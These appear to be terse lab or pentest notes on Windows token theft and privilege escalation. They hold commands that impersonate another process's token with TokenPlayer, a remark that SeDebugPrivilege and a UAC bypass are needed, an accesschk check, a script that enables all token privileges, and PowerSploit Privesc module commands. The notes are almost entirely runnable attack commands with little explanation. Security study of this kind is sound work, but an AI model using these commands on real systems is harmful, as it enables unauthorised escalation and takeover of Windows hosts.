# STEALING TOKENS
```
TokenPlayer-v0.8.exe --impersonate --pid 4536 --spawn
```

needs sedebugprivilege!
Admin in high integrity (UAC Bypass)

----
accesschk.exe -p -f -v 3356
---
https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1

POWERSPLOIT

```powershell
git clone https://github.com/PowerShellMafia/PowerSploit.git
cd .\PowerSploit\Privesc\
import-module .\Privesc.psd1
get-command -module Privesc
Get-ProcessTokenPrivilege
```

login as student
powershell
Start-Process -FilePath "powershell.exe" -Verb RunAs